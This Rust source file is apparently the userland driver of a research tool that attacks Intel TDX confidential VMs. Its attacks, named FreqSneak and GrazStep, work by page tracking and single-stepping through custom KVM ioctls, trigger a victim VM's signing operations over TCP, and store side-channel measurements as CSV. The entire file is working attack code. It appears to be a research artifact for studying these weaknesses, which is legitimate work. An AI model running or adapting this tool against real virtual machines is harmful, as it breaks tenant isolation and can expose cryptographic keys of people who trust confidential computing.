use std::collections::HashMap;
use std::collections::HashSet;
use std::ffi::c_void;
use std::fs::File;

use std::io::prelude::*;
use std::io::BufReader;
use std::net::TcpStream;
use std::os::fd::AsRawFd;
use std::ptr::null_mut;
use std::sync::atomic::AtomicBool;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use anyhow::{anyhow, bail, Context, Result};
use clap::{arg, Parser};
use clap_num::maybe_hex;
use log::debug;

use nix::unistd::sleep;
use serde::Serialize;
use tdx_step_userland::freq_sneak;
use tdx_step_userland::freq_sneak::FreqSneakResult;
use tdx_step_userland::graz_step::GrazStepResult;
use tdx_step_userland::graz_step::ParsedGrazStepResult;
use tdx_step_userland::ioctls;
use tdx_step_userland::types::*;
use tdx_step_userland::vm_setup_helpers;

/// Parses a comma seperated list of <offset>:<paddr> entries to a mapping from
/// offset to paddr. Both are required to be hex numbers
fn parse_abstract_seq_mapping(s: &str) -> Result<HashMap<u64, u64>, String> {
    if s.len() == 0 {
        return Err("length is zero".to_string());
    }
    let mut offset_to_paddr = HashMap::new();
    for encoded_mapping in s.split(",") {
        let tokens = encoded_mapping.split(":").collect::<Vec<_>>();
        if tokens.len() != 2 {
            return Err(format!("Invalid entry \"{}\"", encoded_mapping));
        }
        let offset = u64::from_str_radix(tokens[0].trim_start_matches("0x"), 16)
            .map_err(|e| format!("Failed to parse {} as hex number: {}", tokens[0], e))?;
        let paddr = u64::from_str_radix(tokens[1].trim_start_matches("0x"), 16)
            .map_err(|e| format!("Failed to parse {} as hex number: {}", tokens[1], e))?;

        if offset_to_paddr.contains_key(&offset) {
            return Err(format!("Offset 0x{:x} appears more than once", offset));
        }
        offset_to_paddr.insert(offset, paddr);
    }
    Ok(offset_to_paddr)
}

fn parse_tdvps_indices(s: &str) -> Result<[bool; 6], String> {
    if s == "all" {
        return Ok([true; 6]);
    }

    if s == "none" {
        return Ok([false; 6]);
    }

    let selected_indices = s
        .split(",")
        .map(|v| {
            v.parse::<usize>().context(format!(
                "failed to parse {} to usize. Please provide indices as comma separated list or use \"all\" or \"none\"",
                v
            ))
        })
        .collect::<Result<Vec<_>>>()
        .map_err(|v| format!("failed to parse indices to numbers: {:?}", v))?;

    let mut res: [bool; 6] = [false; 6];
    for x in selected_indices {
        if x > res.len() {
            return Err(format!(
                "index {} is outside of valid range [0,{}[",
                x,
                res.len()
            ));
        }
        res[x] = true;
    }

    Ok(res)
}

#[derive(clap::ValueEnum, Clone, Debug, Serialize, Copy, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
enum AttackType {
    FreqSneak,
    StumbleStep,
    GrazStep,
}

enum AttackResult {
    FreqSneakResult(FreqSneakResult),
    #[allow(dead_code)]
    StumbStepResult(stumble_step_results_t),
    GrazStepResult(GrazStepResult),
}

impl From<AttackType> for attack_type_t {
    fn from(value: AttackType) -> Self {
        match value {
            AttackType::StumbleStep => attack_type_t::STUMBLE_STEP,
            AttackType::FreqSneak => attack_type_t::FREQ_SNEAK,
            AttackType::GrazStep => attack_type_t::GRAZ_STEP,
        }
    }
}

#[derive(Parser, Debug)]
struct CliArgs {
    //
    //Common Arguments
    //
    ///Type of attack that the kernel should do. Influences which parameters are required
    //TODO: use some kind of sub-command structure to make it easier to comprehend which args are required in which situation?
    #[arg(long)]
    attack_type: AttackType,

    ///If true, kernel will only do page tracking and not actually start the apic timer
    /// Intended to debug the general workflow without runnign into apic timer specific instabilities
    #[arg(long, action)]
    debug_mode: bool,

    ///CPU to which we pin the VM's VCPU
    #[arg(long)]
    cpu_vm: u64,

    ///PID of the target VM
    #[arg(long)]
    vm_pid: i32,

    ///ip:port where QEMU's qmp listens
    #[arg(short, long, default_value = "localhost:44422")]
    qmp: String,

    ///Optional list of GPAs that should not be tracked during the attack (in addition to `allowed_during_attack`). However,
    /// these GPAs don't belong to the victims working set but are accessed by the OS/context switch logic. Moved to a separate
    /// argument to highlight this sematnic difference
    #[arg(long, value_parser=maybe_hex::<u64>, num_args=0.., value_delimiter= ',')]
    ignore_gpas: Vec<u64>,

    ///Stop the attack once we hit this gpa
    #[arg(long, value_parser=maybe_hex::<u64>)]
    stop_gpa: u64,

    //TODO: rename? Use Option?
    ///Sequence of GPAs that should be used to determine when victim execution starts. Last GPA is the first GPA of the victim
    /// DO NOT mix with `abstract_sequence_file`
    #[arg(long, value_parser=maybe_hex::<u64>, num_args=0.., value_delimiter=',')]
    trigger_sequence: Vec<u64>,

    ///Index in `triger_sequence` at which we want to carry out the attack
    #[arg(long, value_parser=maybe_hex::<u64>)]
    ts_target_idx: u64,

    ///List of GPAs which should not be exec tracked during the attack, i.e. working set of the victim
    #[arg(long, value_parser=maybe_hex::<u64>, num_args=1.., value_delimiter=',')]
    allowed_during_attack: Vec<u64>,

    //gpa of the targeted code. For the freq-sneak attack we monitor this page to detect the progress
    #[arg(long, value_parser=maybe_hex::<u64>)]
    target_code_gpa: u64,

    ///Number of times the whole attack should be repeated i.e. number of sign calls that we want to observe
    #[arg(long)]
    batch_size: u64,

    #[arg(long)]
    total_number_of_measurements: u64,

    ///Load trigger sequence encoded as abstract offsets from file. Requires you to also specify `abstract_sequence_mapping`.
    /// DO NOT mix with trigger_sequence
    #[arg(long)]
    abstract_sequence_file: Option<String>,

    ///Maps each "abstract offset" from contained in `abstract_sequence_file` to a concrete paddr
    /// Format comma separated list of <offset>:<paddr> where both are 0x prefixed hex numbers
    #[arg(long, value_parser=parse_abstract_seq_mapping)]
    abstract_sequence_mapping: Option<HashMap<u64, u64>>,

    ///Path where measurement results are stored
    #[arg(long, default_value = "./attack-results")]
    out_path_prefix: String,

    #[arg(long, default_value = "127.0.0.1:10080")]
    vm_victim_listen: String,

    #[arg(long, value_parser=maybe_hex::<u64>)]
    manual_end_of_seq_gpa: Option<u64>,

    //
    // FreqSneak Specific Arguments
    //
    ///Max amount of events that the kernel will store for a single attack iteration
    /// Choose this slightly higher than the amount of single steps to accomodate for zero steps
    #[arg(long)]
    max_events_per_iteration: Option<u64>,

    //Used in scenario where kernel copies the signature data to shared, unencrypted memory
    #[arg(long, value_parser=maybe_hex::<u64>)]
    gpa_signature_buffer: Option<u64>,
}

fn prepare_trigger_sequence(args: &CliArgs) -> Result<Vec<u64>> {
    println!("trigger seq {:X?}", args.trigger_sequence);
    if args.trigger_sequence.len() > 0
        && (args.abstract_sequence_file.is_some() || args.abstract_sequence_mapping.is_some())
    {
        bail!(
            r#"You cannot mix "--trigger-sequence" with "--abstract-sequence-file" and/or "--abstract-sequence-mapping""#
        );
    }

    if args.trigger_sequence.len() == 0
        && (args.abstract_sequence_file.is_none() || args.abstract_sequence_mapping.is_none())
    {
        bail!(
            r#"You must supply either "--trigger-sequence" or both  "--abstract-sequence-file" and "--abstract-sequence-mapping""#
        );
    }

    if args.trigger_sequence.len() > 0 {
        let mut seq = args.trigger_sequence.clone();
        if let Some(manual_end) = args.manual_end_of_seq_gpa {
            println!("Adding manual end of seq trigger {:x}", manual_end);
            seq.push(manual_end);
        }
        return Ok(seq);
    } else {
        let abstract_sequence_file = args.abstract_sequence_file.to_owned().unwrap();
        let f = BufReader::new(
            File::open(abstract_sequence_file.clone())
                .context(format!("failed to open {}", abstract_sequence_file))?,
        );
        let sequence: Vec<u64> = serde_json::from_reader(f)?;
        let mapping = args.abstract_sequence_mapping.as_ref().unwrap();
        let mut concrecte_seq = sequence
            .iter()
            .map(|x| {
                mapping
                    .get(x)
                    .cloned()
                    .ok_or(anyhow!("No entry for offset 0x{:x}", x))
            })
            .collect::<Result<Vec<_>>>()
            .context("todo")?;
        if let Some(manual_end) = args.manual_end_of_seq_gpa {
            println!("Adding manual end of seq trigger {:x}", manual_end);
            concrecte_seq.push(manual_end);
        }
        return Ok(concrecte_seq);
    }
}

fn main() -> Result<()> {
    env_logger::init();
    let mut args: CliArgs = CliArgs::parse();

    if args.attack_type == AttackType::StumbleStep {
        bail!("This version of the attack tool does not yet support the StumbleStep attack. Checkout the dedicated version in the artifact manual");
    }

    if args.attack_type == AttackType::FreqSneak
        && args.gpa_signature_buffer.is_some()
        && args.batch_size as usize > FreqSneakResult::MAX_BATCH_SIZE
    {
        bail!(
            "Batch size may not be larger than {}",
            FreqSneakResult::MAX_BATCH_SIZE
        );
    }

    if args.attack_type == AttackType::GrazStep
        && args.gpa_signature_buffer.is_some()
        && args.batch_size as usize > GrazStepResult::MAX_BATCH_SIZE
    {
        bail!(
            "Batch size may not be larger than {}",
            GrazStepResult::MAX_BATCH_SIZE
        );
    }

    let trigger_sequence =
        prepare_trigger_sequence(&args).context("Failed to parse trigger sequence")?;
    let mut trigger_seq_copy = trigger_sequence.clone();

    debug!("Trigger Sequence {:x?}", trigger_sequence);
    //sanity checks on supplied GPAs
    let ignore_gpa_set = args.ignore_gpas.iter().collect::<HashSet<_>>();
    let trigger_gpa_set = trigger_sequence.iter().collect::<HashSet<_>>();
    if !ignore_gpa_set.is_disjoint(&trigger_gpa_set) {
        bail!("--ignore-gpas and --trigger-sequence overlap");
    }
    if !args
        .allowed_during_attack
        .iter()
        .collect::<HashSet<_>>()
        .is_disjoint(&ignore_gpa_set)
    {
        bail!("--allowed-during-attack and --ignore-gpas overlap");
    }
    if ignore_gpa_set.contains(&args.stop_gpa) {
        bail!("--stop-gpa is contained in --ignore-gpas");
    }

    if (args.total_number_of_measurements % args.batch_size) != 0 {
        bail!(
            "Total number of measurements {} is not divisible by batch_size {}",
            args.total_number_of_measurements,
            args.batch_size
        );
    }

    let received_ctrlc = Arc::new(AtomicBool::new(false));
    let r = received_ctrlc.clone();
    ctrlc::set_handler(move || r.store(true, Ordering::Relaxed))
        .context("failed to set ctrl-c handler")?;

    let kvm = File::open("/dev/kvm").context("failed to open kvm file")?;

    debug!("Pinning VM to cpu {}...", args.cpu_vm);
    let vcpu_tid =
        vm_setup_helpers::get_vcpu_thread_id(&args.qmp).context("failed to get VCPU thread id")?;
    vm_setup_helpers::pin_pid_to_cpu(vcpu_tid, args.cpu_vm as usize).context(format!(
        "failed to pin VCPU with tid {} to cpu {}",
        vcpu_tid, args.cpu_vm
    ))?;

    debug!("ignored gpas: {:?}", args.ignore_gpas);

    /*trigger sequence:
        - we track linear from the start until we hit ttx_attack_pos aka ts_target_idx
        - at this point we untrack target_gpa (which should be the element we just got the fault for) and track done_marker_gpa
        - after hitting the done marker, we track the final element of the sequence
    */

    let mut ignore_gpas_copy = args.ignore_gpas.clone();
    //prepare args for start IOCTL
    let mut fr_vmcs_args = tdx_step_fr_vmcs_t {
        target_gpa: args.target_code_gpa,
        done_marker_gpa: args.stop_gpa,
        ignored_gpas: match &args.ignore_gpas.len() {
            0 => null_mut(),
            _ => ignore_gpas_copy.as_mut_ptr(),
        },
        ignored_gpas_len: args.ignore_gpas.len() as u64,
        target_trigger_sequence_len: trigger_sequence.len() as u64,
        target_trigger_sequence: trigger_seq_copy.as_mut_ptr(),
        attack_phase_allowed_gpas_len: args.allowed_during_attack.len() as u64,
        attack_phase_allowed_gpas: args.allowed_during_attack.as_mut_ptr(),
        want_attack_iterations: args.batch_size,
        tts_attack_pos: args.ts_target_idx,
        gpa_shared_sigbuf: match args.attack_type {
            AttackType::FreqSneak | AttackType::GrazStep => args.gpa_signature_buffer.unwrap_or(0),
            AttackType::StumbleStep => 0,
        },
        victim_vm_pid: args.vm_pid,
    };

    let mut gathered_measurements = 0;
    let mut user_abort = false;
    while (!user_abort) && (gathered_measurements < args.total_number_of_measurements) {
        //sometimes tracking the target pages (in the kernel) silently failes (in the sense that the track command does not have any effect, but does also not give an error). Explictly untracking the pages once solves this issue. Investigate!
        for gpa in &trigger_gpa_set {
            unsafe {
                match ioctls::unblock_page(
                    kvm.as_raw_fd(),
                    &mut tdx_step_unblock_page_t {
                        gpa: **gpa,
                        vm_pid: args.vm_pid,
                    },
                ) {
                    Ok(_) => println!("Dummy unblock for 0x{:x} succeeded", gpa),
                    Err(e) => println!("Dummy unblock for 0x{:x} faield: {}", gpa, e),
                };
            }
        }
        unsafe {
            match ioctls::unblock_page(
                kvm.as_raw_fd(),
                &mut tdx_step_unblock_page_t {
                    gpa: args.stop_gpa,
                    vm_pid: args.vm_pid,
                },
            ) {
                Ok(_) => println!("Dummy unblock for 0x{:x} succeeded", args.stop_gpa),
                Err(e) => println!("Dummy unblock for 0x{:x} faield: {}", args.stop_gpa, e),
            };
        }

        debug!("Invoking attack start in kernel");
        unsafe {
            ioctls::fr_vmcs(kvm.as_raw_fd(), &mut fr_vmcs_args).context("fr_vmcs ioctl failed")?;
        }

        debug!("Triggering victim via network");

        let mut notify_stream = TcpStream::connect(args.vm_victim_listen.clone())
            .context("failed to open stream to victim")?;
        notify_stream
            .write("run".as_bytes())
            .context("failed to trigger victim")?;
        drop(notify_stream);
        debug!("waiting for kernel part to finish");

        //let mut prev_batch_idx = None;
        //let mut iterations_without_progress = 0;
        while !received_ctrlc.load(Ordering::Relaxed) {
            debug!("checking status");
            let mut status = tdx_step_is_fr_vmcs_done_t {
                is_done: false,
                remaining_timer_interrupts: 0,
                want_attack_iterations: 0,
                attack_state: 0,
            };
            unsafe {
                ioctls::is_fr_vmcs_done(kvm.as_raw_fd(), &mut status)
                    .context("is_fr_vmcs_done ioctl failed")?;
            }
            if status.is_done {
                break;
            }
            debug!(
                "Victim is at batch idx {}, state {}, want iterations {}. Total idx {}",
                status.remaining_timer_interrupts, //this needs to be renamed
                status.attack_state,
                status.want_attack_iterations,
                gathered_measurements + status.remaining_timer_interrupts,
            );
            //Wait a bit between status updates
            thread::sleep(Duration::from_secs(2));
        }
        if received_ctrlc.load(Ordering::Relaxed) {
            debug!("Aborting due to user request");
            user_abort = true;
        }

        debug!("Stopping attack & collecting data");

        let attack_data: AttackResult;
        let mut terminate_args: tdx_step_terminate_fr_vmcs_t;
        match args.attack_type {
            AttackType::StumbleStep => todo!(),
            AttackType::FreqSneak => {
                let mut v = FreqSneakResult::new(
                    args.max_events_per_iteration
                        .context("freq-sneak requires \"max_events_per_iteration\" param")?,
                    args.batch_size,
                );
                terminate_args = tdx_step_terminate_fr_vmcs_t {
                    data: v.as_freq_sneak_results_t_ref() as *mut c_void,
                };
                attack_data = AttackResult::FreqSneakResult(v);
            }
            AttackType::GrazStep => {
                debug!("Creating result buffer with {} elements", args.batch_size);
                let mut v = GrazStepResult::new(args.batch_size);
                terminate_args = tdx_step_terminate_fr_vmcs_t {
                    data: v.as_graz_step_results_t() as *mut c_void,
                };
                debug!("vaddr of buffer 0x{:x}", terminate_args.data as u64);
                attack_data = AttackResult::GrazStepResult(v);
            }
        }

        unsafe {
            ioctls::terminate_fr_vmcs(kvm.as_raw_fd(), &mut terminate_args)
                .context("terminate_fr_vmcs failed")?;
        }
        if user_abort {
            continue;
        }

        let out_path_prefx = format!(
            "{}-{}_{}",
            args.out_path_prefix.clone(),
            gathered_measurements,
            gathered_measurements + args.batch_size
        );

        match attack_data {
            AttackResult::FreqSneakResult(data) => {
                freq_sneak::store_as_csv(data.clone().into(), out_path_prefx)
                    .context("freq_sneak::store_as_csv failed")?
            }
            AttackResult::StumbStepResult(_) => todo!(),
            AttackResult::GrazStepResult(data) => {
                let parsed_data: ParsedGrazStepResult = data.into();
                parsed_data
                    .store_as_csv(out_path_prefx)
                    .context("ParsedGrazStepResult::store_as_csv failed")?;
            }
        }

        debug!("done!");

        gathered_measurements += args.batch_size;
    }

    Ok(())
}
